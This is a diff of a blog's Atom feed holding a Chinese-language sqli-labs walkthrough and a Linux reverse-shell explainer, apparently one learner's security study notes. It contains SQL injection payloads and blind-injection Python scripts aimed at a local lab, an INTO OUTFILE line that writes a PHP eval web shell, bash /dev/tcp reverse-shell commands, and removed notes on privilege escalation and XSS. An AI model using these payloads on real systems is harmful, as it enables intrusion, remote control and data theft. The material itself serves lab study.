@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://yoursite.com/"/>
-  <updated>2020-09-08T11:18:12.397Z</updated>
+  <updated>2020-09-15T06:42:10.532Z</updated>
   <id>http://yoursite.com/</id>
   
   <author>
@@ -15,30 +15,6 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
-  
-  <entry>
-    <title>mysql提权</title>
-    <link href="http://yoursite.com/2020/09/07/mysql%E6%8F%90%E6%9D%83/"/>
-    <id>http://yoursite.com/2020/09/07/mysql%E6%8F%90%E6%9D%83/</id>
-    <published>2020-09-07T13:51:43.000Z</published>
-    <updated>2020-09-08T11:18:12.397Z</updated>
-    
-    <content type="html"><![CDATA[<p>MySQL提权</p><p>1.UDF提权<br>udf是Mysql类提权的方式之一。前提是已知mysql中root的账号密码，我们在拿到webshell后，可以看网站根目录下的config.php里，一般都有mysql的账号密码。利用root权限，创建带有调用cmd函数的’udf.dll’(动态链接库)。当我们把’udf.dll’导出指定文件夹引入Mysql时，其中的调用函数拿出来当作mysql的函数使用。这样我们自定义的函数才被当作本机函数执行。在使用CREAT FUNCITON调用dll中的函数后，mysql账号转化为system权限，从而来提权。<br>2.MOF提权<br>托管对象格式 (MOF) 文件是创建和注册提供程序、事件类别和事件的简便方法。文件路径为：c:/windows/system32/wbme/mof/，其作用是每隔五秒就会去监控进程创建和死亡。MOF文件每五秒就会执行，而且是系统权限，通过mysql使用load_file 将文件写入/wbme/mof，然后系统每隔五秒就会执行一次我们上传的MOF。MOF当中有一段是vbs脚本，可以通过控制这段vbs脚本的内容让系统执行命令，进行提权。</p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;p&gt;MySQL提权&lt;/p&gt;&lt;p&gt;1.UDF提权&lt;br&gt;udf是Mysql类提权的方式之一。前提是已知mysql中root的账号密码，我们在拿到webshell后，可以看网站根目录下的config.php里，一般都有mysql的账号密码。利用root权限，创建带有调用cmd函数的
-      
-    
-    </summary>
-    
-    
-      <category term="笔记" scheme="http://yoursite.com/categories/%E7%AC%94%E8%AE%B0/"/>
-    
-    
-  </entry>
   
   <entry>
     <title>ATT&amp;CK红队评估实战靶场</title>
@@ -62,6 +38,29 @@
     
     
       <category term="域渗透" scheme="http://yoursite.com/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>sqli-labs wp</title>
+    <link href="http://yoursite.com/2020/08/06/sqli-labs-wp/"/>
+    <id>http://yoursite.com/2020/08/06/sqli-labs-wp/</id>
+    <published>2020-08-06T01:54:01.000Z</published>
+    <updated>2020-09-17T14:16:29.460Z</updated>
+    
+    <content type="html"><![CDATA[<p><a href="https://xz.aliyun.com/t/1298" target="_blank" rel="noopener">学习资料</a></p><h2 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h2><p>先判断数据类型</p><p>爆数据库名</p><p>?id=-1’ union select 1,group_concat(schema_name),3 from information_schema.schemata–+</p><a id="more"></a><p>爆表名</p><p>?id=-1’ union select 1,group_concat(table_name),3 from information_schema.tables where  table_schema=’security’ –+</p><p>爆列名</p><p>?id=-1’ union select 1,group_concat(column_name),3 from information_schema.columns where  table_name=’users’ –+</p><p>爆值</p><p>?id=-1’ union select 1,username,password from users where id=2 –+</p><h2 id="Less-2-4"><a href="#Less-2-4" class="headerlink" title="Less-2-4"></a>Less-2-4</h2><p>和上面差不多</p><h2 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a>Less-5</h2><p>用ascii和substr盲注简单脚本   关键函数过滤可以用mid和ord</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://localhost:8080/sqli-labs-master/Less-5/"</span></span><br><span class="line">payload=<span class="string">"?id=1' and ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=\'users\'),%s,1))&gt;%s--+"</span></span><br><span class="line">table=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">100</span>):</span><br><span class="line">    max=<span class="number">126</span></span><br><span class="line">    min=<span class="number">33</span></span><br><span class="line">    <span class="keyword">while</span> abs(max-min)&gt;<span class="number">1</span>:</span><br><span class="line">        mid=int((max+min)/<span class="number">2</span>)</span><br><span class="line">        p=payload % (str(i),str(mid))</span><br><span class="line">        response=requests.get(url+p)</span><br><span class="line">        <span class="keyword">if</span> response.text.find(<span class="string">"You are in"</span>)!=<span class="number">-1</span>:</span><br><span class="line">            min=mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            max=mid</span><br><span class="line">    table=table+chr(max)</span><br><span class="line">    print(<span class="string">"the tables is :%s"</span> % table)</span><br></pre></td></tr></table></figure><p>用正则regexp进行注入</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">strs = string.printable</span><br><span class="line">url = <span class="string">"http://localhost:8080/sqli-labs-master/Less-5/?id=-1"</span></span><br><span class="line"></span><br><span class="line">database1 = <span class="string">"' or database() regexp '^&#123;&#125;'--+"</span></span><br><span class="line">table1 = <span class="string">"' or (select table_name from information_schema.tables where table_schema=database() limit 0,1) regexp '^&#123;&#125;'--+"</span></span><br><span class="line">cloumn1 = <span class="string">"' or (select column_name from information_schema.columns where table_name=\"users\" and table_schema=database() limit 1,1) regexp '^&#123;&#125;'--+"</span></span><br><span class="line">data1 = <span class="string">"' or (select username from users limit 0,1) regexp '^&#123;&#125;'--+"</span></span><br><span class="line"></span><br><span class="line">payload = database1</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    name = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">40</span>):</span><br><span class="line">        char = <span class="string">''</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> strs:</span><br><span class="line">            payloads = payload.format(name+j)</span><br><span class="line">            urls = url+payloads</span><br><span class="line">            r = requests.get(urls)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">"You are in"</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                name += j</span><br><span class="line">                print(j,end=<span class="string">''</span>)</span><br><span class="line">                char = j</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> char ==<span class="string">'#'</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>用floor报错注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:8080/sqli-labs-master/Less-5/?id=1&apos; union Select 1,count(*),concat(0x3a,0x3a,(select user()),0</span><br><span class="line">x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a--+</span><br></pre></td></tr></table></figure><p> xpath 函数报错注入 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:8080/sqli-labs-master/Less-5/?id=1&apos; and extractvalue(1,concat(0x7e,(select @@version),0x7e)) --+</span><br></pre></td></tr></table></figure><h2 id="Less-6"><a href="#Less-6" class="headerlink" title="Less-6"></a>Less-6</h2><p>和上面差不多</p><p>只是把’换成”</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$id = &apos;&quot;&apos;.$id.&apos;&quot;&apos;;</span><br><span class="line">$sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure><h2 id="Less-7"><a href="#Less-7" class="headerlink" title="Less-7"></a>Less-7</h2><p>Load_file(file_name):</p><p>读取文件并返回该文件的内容作为一个字符串。 使用条件： </p><p>A、必须有权限读取并且文件必须完全可读 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select count(*) from mysql.user)&gt;0/*</span><br></pre></td></tr></table></figure><p>如果结果返回正常,说明具有读写权限。 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select count(*) from mysql.user)&gt;0/*</span><br></pre></td></tr></table></figure><p>返回错误，应该是管理员给数据库帐户降权 </p><p>B、欲读取文件必须在服务器上 </p><p>C、必须指定文件完整的路径 </p><p>D、欲读取文件必须小于 max_allowed_packet </p><p>如果该文件不存在，或因为上面的任一原因而不能被读出，函数返回空。比较难满足的 就是权限，在 windows 下，如果 NTFS 设置得当，是不能读取相关的文件的，当遇到只有 administrators 才能访问的文件，users 就别想 load_file 出来。 </p><p>例如下面</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqllib/Less-7/?id=1&apos;))UNION SELECT 1,2,&apos;&lt;?php @eval($_post[“mima”])?&gt;&apos; into outfile &quot;c:\\wamp\\www\\sqllib\\Less-7\\yijuhua.php&quot;--+</span><br></pre></td></tr></table></figure><h2 id="Less-8"><a href="#Less-8" class="headerlink" title="Less-8"></a>Less-8</h2><p>可以用时间盲注</p><p>简单的爆数据库名脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">'''http://localhost:8080/sqli-labs-master/Less-8?id=1'and if(ascii(substr(database(),&#123;&#125;,1))=&#123;&#125;,1,sleep(1))--+'''</span></span><br><span class="line"></span><br><span class="line">database = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">10</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">97</span>,<span class="number">127</span>):</span><br><span class="line">        payload = url.format(i,j)</span><br><span class="line">        print(payload)</span><br><span class="line">        start = time.time()</span><br><span class="line">        ans = requests.get(payload)</span><br><span class="line">        <span class="keyword">if</span> time.time()-start &gt;<span class="number">1</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            database += chr(j)</span><br><span class="line">            print(database)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h2 id="Less-9"><a href="#Less-9" class="headerlink" title="Less-9"></a>Less-9</h2><p>和上面差不多，可以用基于时间的盲注</p><h2 id="Less-10"><a href="#Less-10" class="headerlink" title="Less-10"></a>Less-10</h2><p>双引号的时间盲注</p><h2 id="Less-11"><a href="#Less-11" class="headerlink" title="Less-11"></a>Less-11</h2><p>是post注入</p><p>用万能密码</p><p>admin</p><p>1’ or ‘1’=’1</p><p>或者</p><p> admin’ or 1=1# </p><p>123</p><p>然后进行注入</p><p>例如爆数据库名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">帐号:1admin&apos; union select 1,database()#</span><br><span class="line">密码随意</span><br></pre></td></tr></table></figure><h2 id="Less-12"><a href="#Less-12" class="headerlink" title="Less-12"></a>Less-12</h2><p>和上面一样，对 id 进行了 (“id”)处理 </p><h2 id="Less-13"><a href="#Less-13" class="headerlink" title="Less-13"></a>Less-13</h2><p>对id进行’)处理</p><p>并且登录没有数据回显</p><p>是布尔盲注</p><p>uname=admin’)and left(database(),1)&gt;’a’#&amp;passwd=1&amp;submit=Submit</p><h2 id="Less-14"><a href="#Less-14" class="headerlink" title="Less-14"></a>Less-14</h2><p>变成双引号的了</p><p>uname=admin”or 1=1#&amp;passwd=1&amp;submit=Submit</p><p>尝试进行报错注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&quot; and updatexml(1,concat(0x7e,(select @@version),0x7e),1)#</span><br><span class="line">&amp;passwd=1</span><br><span class="line">&amp;submit=Submit</span><br></pre></td></tr></table></figure><h2 id="Less-15"><a href="#Less-15" class="headerlink" title="Less-15"></a>Less-15</h2><p>没有错误提醒</p><p>可以用基于时间的盲注</p><h2 id="Less-16"><a href="#Less-16" class="headerlink" title="Less-16"></a>Less-16</h2><p>和上面差不多一样</p><h2 id="Less-17"><a href="#Less-17" class="headerlink" title="Less-17"></a>Less-17</h2><p>uname=admin&amp;passwd=11’and updatexml(1,concat(0x7e,(select @@version),0x7e),1)#&amp;sub<br>mit=Submit</p><h2 id="Less-18"><a href="#Less-18" class="headerlink" title="Less-18"></a>Less-18</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$insert=&quot;INSERT INTO &apos;security&apos;.&apos;uagents&apos; (&apos;uagent&apos;, &apos;ip_address&apos;, &apos;username&apos;) VALUES (&apos;$uagent&apos;, &apos;$IP&apos;, $uname)&quot;;</span><br></pre></td></tr></table></figure><p> 将 user-agent 修改为’and extractvalue(1,concat(0x7e,(select @@version),0x7e)) and ‘1’=’1 </p><h2 id="less-19-22"><a href="#less-19-22" class="headerlink" title="less-19-22"></a>less-19-22</h2><p>都和上面差不多</p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;&lt;a href=&quot;https://xz.aliyun.com/t/1298&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;学习资料&lt;/a&gt;&lt;/p&gt;&lt;h2 id=&quot;Less-1&quot;&gt;&lt;a href=&quot;#Less-1&quot; class=&quot;headerlink&quot; title=&quot;Less-1&quot;&gt;&lt;/a&gt;Less-1&lt;/h2&gt;&lt;p&gt;先判断数据类型&lt;/p&gt;&lt;p&gt;爆数据库名&lt;/p&gt;&lt;p&gt;?id=-1’ union select 1,group_concat(schema_name),3 from information_schema.schemata–+&lt;/p&gt;
+    
+    </summary>
+    
+    
+      <category term="笔记" scheme="http://yoursite.com/categories/%E7%AC%94%E8%AE%B0/"/>
+    
+    
+      <category term="sql" scheme="http://yoursite.com/tags/sql/"/>
     
   </entry>
   
@@ -159,30 +158,6 @@
   </entry>
   
   <entry>
-    <title>Linux下的提权</title>
-    <link href="http://yoursite.com/2020/06/19/Linux%E4%B8%8B%E7%9A%84%E6%8F%90%E6%9D%83/"/>
-    <id>http://yoursite.com/2020/06/19/Linux%E4%B8%8B%E7%9A%84%E6%8F%90%E6%9D%83/</id>
-    <published>2020-06-19T10:44:30.000Z</published>
-    <updated>2020-09-08T11:19:44.468Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="Linux下用SUID提权"><a href="#Linux下用SUID提权" class="headerlink" title="Linux下用SUID提权"></a>Linux下用SUID提权</h1><p><a href="https://blog.csdn.net/qq_36119192/article/details/84872644" target="_blank" rel="noopener">Linux下用SUID提权</a></p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;h1 id=&quot;Linux下用SUID提权&quot;&gt;&lt;a href=&quot;#Linux下用SUID提权&quot; class=&quot;headerlink&quot; title=&quot;Linux下用SUID提权&quot;&gt;&lt;/a&gt;Linux下用SUID提权&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;https://blog.csdn
-      
-    
-    </summary>
-    
-    
-      <category term="笔记" scheme="http://yoursite.com/categories/%E7%AC%94%E8%AE%B0/"/>
-    
-    
-  </entry>
-  
-  <entry>
     <title>php伪协议</title>
     <link href="http://yoursite.com/2020/06/18/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/"/>
     <id>http://yoursite.com/2020/06/18/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/</id>
@@ -268,30 +243,6 @@
       
       
         &lt;p&gt;&lt;a href=&quot;https://blog.csdn.net/qq_40657585/article/details/84260844&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;SSI注入漏洞&lt;/a&gt;&lt;/p&gt;
-      
-    
-    </summary>
-    
-    
-      <category term="笔记" scheme="http://yoursite.com/categories/%E7%AC%94%E8%AE%B0/"/>
-    
-    
-  </entry>
-  
-  <entry>
-    <title>CTF XSS</title>
-    <link href="http://yoursite.com/2020/05/13/CTF-XSS/"/>
-    <id>http://yoursite.com/2020/05/13/CTF-XSS/</id>
-    <published>2020-05-13T09:45:47.000Z</published>
-    <updated>2020-09-08T11:18:40.546Z</updated>
-    
-    <content type="html"><![CDATA[<p><a href="https://www.cnblogs.com/20175211lyz/p/12207467.html" target="_blank" rel="noopener">CTF XSS</a><br><a href="https://www.freebuf.com/articles/web/244253.html" target="_blank" rel="noopener">XSS Challenges通关和Beef介绍</a></p><blockquote><p>1:没有过滤,直接用标签即可 </p><script>alert(document.domain);</script><p>2:闭合标签,再引入script<br>11111”&gt;<script>alert(document.domain);</script><br>#或者闭合前边引号,引入事件<br>“ onmouseover=alert(document.domain)&gt; </p></blockquote>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;p&gt;&lt;a href=&quot;https://www.cnblogs.com/20175211lyz/p/12207467.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;CTF XSS&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;https://www.freebuf.
       
     
     </summary>
@@ -472,6 +423,50 @@
       
         &lt;p&gt;&lt;a href=&quot;https://blog.csdn.net/mochu7777777/article/details/104631142&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;关于PHP正则的一些绕过方法&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;http
       
+    
+    </summary>
+    
+    
+      <category term="笔记" scheme="http://yoursite.com/categories/%E7%AC%94%E8%AE%B0/"/>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>Linux反弹shell</title>
+    <link href="http://yoursite.com/2020/04/24/Linux%E5%8F%8D%E5%BC%B9shell/"/>
+    <id>http://yoursite.com/2020/04/24/Linux%E5%8F%8D%E5%BC%B9shell/</id>
+    <published>2020-04-24T07:57:02.000Z</published>
+    <updated>2020-09-17T06:47:18.763Z</updated>
+    
+    <content type="html"><![CDATA[<p><a href="https://xz.aliyun.com/t/2548" target="_blank" rel="noopener">Linux反弹shell（一）文件描述符与重定向</a><br><a href="https://xz.aliyun.com/t/2549" target="_blank" rel="noopener">Linux 反弹shell（二）反弹shell的本质</a></p><h2 id="文件描述符"><a href="#文件描述符" class="headerlink" title="文件描述符"></a><strong>文件描述符</strong></h2><blockquote><p><strong>linux文件描述符</strong>：可以理解为linux跟踪打开文件，而分配的一个数字，这个数字有点类似c语言操作文件时候的句柄，通过句柄就可以实现文件的读写操作。</p></blockquote><a id="more"></a><p>当Linux启动的时候会默认打开三个文件描述符，分别是：</p><p>标准输入standard input 0 （默认设备键盘）<br>标准输出standard output 1（默认设备显示器）<br>错误输出：error output 2（默认设备显示器）</p><h3 id="注意："><a href="#注意：" class="headerlink" title="注意："></a><strong>注意：</strong></h3><p>（1）以后再打开文件，描述符可以依次增加<br>（2）一条shell命令，都会继承其父进程的文件描述符，因此所有的shell命令，都会默认有三个文件描述符。</p><p><strong>文件所有输入输出都是由该进程所有打开的文件描述符控制的。（Linux一切皆文件，就连键盘显示器设备都是文件，因此他们的输入输出也是由文件描述符控制）</strong></p><p>一条命令执行以前先会按照默认的情况进行绑定（也就是上面所说的 0,1,2），如果我们有时候需要让输出不显示在显示器上，而是输出到文件或者其他设备，那我们就需要重定向。</p><h2 id="重定向"><a href="#重定向" class="headerlink" title="重定向"></a><strong>重定向</strong></h2><p>重定向主要分为两种(其他复杂的都是从这两种衍生而来的)：</p><p>（1）输入重定向 &lt; &lt;&lt;<br>（2）输出重定向 &gt; &gt;&gt;</p><h3 id="重点："><a href="#重点：" class="headerlink" title="重点："></a><strong>重点：</strong></h3><p>1.bash 在执行一条指令的时候，首先会检查命令中存不存在重定向的符号，如果存在那么首先将文件描述符重定向（之前说过了，输入输出操作都是依赖文件描述符实现的，重定向输入输出本质上就是重定向文件描述符），然后在把重定向去掉，执行指令</p><p>2.如果指令中存在多个重定向，那么不要随便改变顺序，因为重定向是从左向右解析的，改变顺序可能会带来完全不同的结果（这一点我们后面会展示）</p><p>3.&lt; 是对标准输入 0 重定向 ，&gt; 是对标准输出 1 重定向</p><p><strong>4.再强调一下，重定向就是针对文件描述符的操作</strong></p><h3 id="1-输入重定向"><a href="#1-输入重定向" class="headerlink" title="1.输入重定向"></a><strong>1.输入重定向</strong></h3><p>格式： [n]&lt; word <strong>（注意[n]与&lt;之间没有空格）</strong></p><p>说明：将文件描述符 n 重定向到 word 指代的文件（以只读方式打开）,如果n省略就是0（标准输入）</p><p> 解释: 解析器解析到 “&lt;” 以后会先处理重定向，将标准输入重定向到file，之后cat再从标准输入读取指令的时候，由于标准输入已经重定向到了file ，于是cat就从file中读取指令了。(<strong>有没有觉得这个其实就是C语言中的指针或者文件句柄，就是将0这个指针指向了不同的地址，自然有不同的输入</strong>) </p><h3 id="2-输出重定向"><a href="#2-输出重定向" class="headerlink" title="2.输出重定向"></a><strong>2.输出重定向</strong></h3><p>格式： [n]&gt; word</p><p> 说明： 将文件描述符 n 重定向到word 指代的文件（以写的方式打开），如果n 省略则默认就是 1（标准输出） </p><h3 id="3-标准输出与标准错误输出重定向"><a href="#3-标准输出与标准错误输出重定向" class="headerlink" title="3.标准输出与标准错误输出重定向"></a><strong>3.标准输出与标准错误输出重定向</strong></h3><p>格式： &amp;&gt; word &gt;&amp; word</p><p>说明:将标准输出与标准错误输出都定向到word代表的文件（以写的方式打开），两种格式意义完全相同，这种格式完全等价于 &gt; word 2&gt;&amp;1 (2&gt;&amp;1 是将标准错误输出复制到标准输出，&amp;是为了区分文件1和文件描述符1的，详细的介绍后面会有)</p><h3 id="4-文件描述符的复制"><a href="#4-文件描述符的复制" class="headerlink" title="4.文件描述符的复制"></a><strong>4.文件描述符的复制</strong></h3><p>格式： [n]&lt;&amp;[m] / [n]&gt;&amp;[m] <strong>(这里所有字符之间不要有空格)</strong></p><p>说明：</p><p>1）这里两个<strong>都是将文件描述符 n 复制到 m</strong> ，两者的区别是，前者是以只读的形式打开，后者是以写的形式打开</p><p><strong>因此 0&lt;&amp;1 和 0&gt;&amp;1 是完全等价的（读/写方式打开对其没有任何影响）</strong></p><p>2）这里的&amp; 目的是为了区分数字名字的文件和文件描述符，如果没有&amp; 系统会认为是将文件描述符重定向到了一个数字作为文件名的文件，而不是一个文件描述符</p><p>这里就可以用上面的例子作为演示，将错误和正确的输出都输入到文件中</p><h3 id="重点：-1"><a href="#重点：-1" class="headerlink" title="重点："></a><strong>重点：</strong></h3><p>之前我们说过，重定向符号的顺序不能随便换，因为系统是从左到右执行的，我们下面就举一个例子</p><p>(1)cmd &gt; file 2&gt;&amp;1<br>(2)cmd 2&gt;&amp;1 &gt;file</p><p>与第一条指令类似的指令在上面我已经介绍过了，我们现在就来看看第二条指令的执行过程</p><p><strong>1.首先解析器解析到 2&gt;&amp;1</strong></p><p> <strong>2.解析器再向后解析到 “&gt;”</strong> </p><h3 id="5-exec-绑定重定向"><a href="#5-exec-绑定重定向" class="headerlink" title="5.exec 绑定重定向"></a><strong>5.exec 绑定重定向</strong></h3><p>格式：exec [n] &lt;/&gt; file/[n]</p><p>上面的输入输出重定向将输入和输出绑定文件或者设备以后只对当前的那条指令有效，如果需要接下来的指令都支持的话就需要使用 exec 指令</p><h3 id="重点：-2"><a href="#重点：-2" class="headerlink" title="重点："></a><strong>重点：</strong></h3><p>格式： [n]&lt;&gt;word</p><p>说明：以读写方式打开word指代的文件，并将n重定向到该文件。如果n不指定的话，默认为标准输入。</p><h2 id="什么是反弹shell"><a href="#什么是反弹shell" class="headerlink" title="什么是反弹shell"></a><strong>什么是反弹shell</strong></h2><p> reverse shell，就是控制端监听在某TCP/UDP端口，被控端发起请求到该端口，并将其命令行的输入输出转到控制端。reverse shell与telnet，ssh等标准shell对应，本质上是网络概念的客户端与服务端的角色反转。 </p><h2 id="为什么要反弹shell"><a href="#为什么要反弹shell" class="headerlink" title="为什么要反弹shell"></a><strong>为什么要反弹shell</strong></h2><p>通常用于被控端因防火墙受限、权限不足、端口被占用等情形</p><p>假设我们攻击了一台机器，打开了该机器的一个端口，攻击者在自己的机器去连接目标机器（目标ip：目标机器端口），这是比较常规的形式，我们叫做正向连接。远程桌面，web服务，ssh，telnet等等，都是正向连接。那么什么情况下正向连接不太好用了呢？</p><p>1.某客户机中了你的网马，但是它在局域网内，你直接连接不了。</p><p>2.它的ip会动态改变，你不能持续控制。</p><p>3.由于防火墙等限制，对方机器只能发送请求，不能接收请求。</p><p>4.对于病毒，木马，受害者什么时候能中招，对方的网络环境是什么样的，什么时候开关机，都是未知，所以建立一个服务端，让恶意程序主动连接，才是上策。</p><p>那么反弹就很好理解了， 攻击者指定服务端，受害者主机主动连接攻击者的服务端程序，就叫反弹连接。</p><h2 id="反弹shell的本质是什么"><a href="#反弹shell的本质是什么" class="headerlink" title="反弹shell的本质是什么"></a><strong>反弹shell的本质是什么</strong></h2><p>我们就以最常见的bash为例：<br>attacker机器上执行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 2333</span><br></pre></td></tr></table></figure><p>victim 机器上执行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.146.129/2333 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p>可以看到在攻击机上出现了受害者机器的shell</p><p>解释一下这条命令具体的含义：</p><p><strong>1.bash -i</strong></p><p>1）bash 是linux 的一个比较常见的shell,其实linux的shell还有很多，比如 sh、zsh、等，他们之间有着细小差别</p><p>2）-i 这个参数表示的是产生交互式的shell</p><p><strong>2./dev/tcp/ip/port</strong></p><p>/dev/tcp|udp/ip/port 这个文件是特别特殊的，实际上可以将其看成一个设备（Linux下一切皆文件），其实如果你访问这个文件的位置他是不存在的。</p><p> 但是如果你在一方监听端口的情况下对这个文件进行读写，就能实现与监听端口的服务器的socket通信 </p><p>为了实现交互，我们需要把受害者交互式shell的输出重定向到攻击机上<br>在受害者机器上输入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt; /dev/tcp/192.168.146.129/2333</span><br></pre></td></tr></table></figure><p> 任何在受害者机器上执行的指令都不会直接回显了，而是在攻击者机器上回显。 </p><p>但是这里有一个问题，攻击者没有能够实现对受害者的控制，攻击者执行的命令没法在受害者电脑上执行。</p><p>于是我们似乎还需要一条这样的指令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &lt; /dev/tcp/192.168.146.129/2333</span><br></pre></td></tr></table></figure><p> 现在我们需要将两条指令结合起来 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt; /dev/tcp/192.168.146.129/2333 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p> <strong>输入0是由/dev/tcp/192.168.146.129/2333 输入的，也就是攻击机的输入，命令执行的结果1，会输出到/dev/tcp/192.168.156.129/2333上，这就形成了一个回路，实现了我们远程交互式shell 的功能</strong> </p><p> <strong>注意：</strong><br>但是这里有一个问题，就是我们在受害者机器上依然能看到我们在攻击者机器中执行的指令 ，如下图所示，我们马上解决 </p><p><strong>4. &gt;&amp;、&amp;&gt;</strong></p><p>这个符号在我附上链接的那篇文章中也提到了，作用就是混合输出（错误、正确输出都输出到一个地方）</p><p>现在我们解决一下前面的问题：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt; /dev/tcp/192.168.146.129/2333 0&gt;&amp;1 2&gt;&amp;1</span><br></pre></td></tr></table></figure><p>当然我们也可以执行与之完全等价的指令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.146.129/2333 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p> 